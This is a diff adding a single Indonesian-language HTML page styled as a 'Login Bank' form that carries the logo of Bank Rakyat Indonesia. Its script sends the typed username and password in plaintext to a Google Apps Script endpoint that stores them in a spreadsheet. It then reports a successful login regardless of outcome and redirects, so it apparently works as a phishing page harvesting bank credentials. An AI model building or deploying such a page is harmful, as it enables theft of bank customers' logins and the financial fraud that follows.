@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login + Google Spreadsheet</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #005baa, #00aaff);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      width: 320px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      text-align: center;
+    }
+
+    .logo {
+      width: 80px;
+      margin-bottom: 10px;
+    }
+
+    h3 {
+      margin-bottom: 20px;
+      color: #005baa;
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      margin-top: 5px;
+      box-sizing: border-box;
+    }
+
+    .password-container {
+      position: relative;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 12px;
+      color: #005baa;
+      user-select: none;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 10px;
+      background: #005baa;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .btn:hover {
+      background: #004080;
+    }
+
+    .success {
+      color: green;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    .error {
+      color: red;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="login-container">
+    <!-- Logo -->
+    <img
+      src="https://upload.wikimedia.org/wikipedia/commons/2/2e/BRI_2020.svg"
+      class="logo"
+      alt="Logo Bank"
+    />
+
+    <h3>Login Bank</h3>
+
+    <!-- Username -->
+    <div class="input-group">
+      <input type="text" id="username" placeholder="Masukkan Username" />
+    </div>
+
+    <!-- Password -->
+    <div class="input-group password-container">
+      <input
+        type="password"
+        id="password"
+        placeholder="Masukkan Password"
+      />
+      <span class="toggle-password" onclick="togglePassword()">Show</span>
+    </div>
+
+    <!-- Button -->
+    <button class="btn" onclick="kirimData()">
+      Login & Simpan
+    </button>
+
+    <!-- Message -->
+    <p id="msg"></p>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const pass = document.getElementById("password");
+      const toggle = document.querySelector(".toggle-password");
+
+      if (pass.type === "password") {
+        pass.type = "text";
+        toggle.textContent = "Hide";
+      } else {
+        pass.type = "password";
+        toggle.textContent = "Show";
+      }
+    }
+
+    function kirimData() {
+  const username = document.getElementById("username").value.trim();
+  const password = document.getElementById("password").value.trim();
+  const msg = document.getElementById("msg");
+
+  if (!username || !password) {
+    msg.innerHTML = "<span class='error'>Harus isi semua data!</span>";
+    return;
+  }
+
+  const url = "https://script.google.com/macros/s/AKfycbzRseQe3eg9oxXOmfQLYXvzgWzgPY6KcBMXdCi1wj5-urnGjaHPxQNvd8I_Vp9fUK3SfA/exec";
+
+  // kirim data ke spreadsheet
+  fetch(url, {
+    method: "POST",
+    mode: "no-cors",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      username: username,
+      password: password,
+    }),
+  });
+
+  // simpan status login di browser
+  localStorage.setItem("loginUser", username);
+
+  // tampilkan pesan
+  msg.innerHTML = "<span class='success'>Login berhasil ✅</span>";
+
+  // pindah ke halaman dashboard
+  setTimeout(() => {
+    window.location.href = "dashboard.html";
+  }, 1000);
+
+    }
+  </script>
+</body>
+</html>
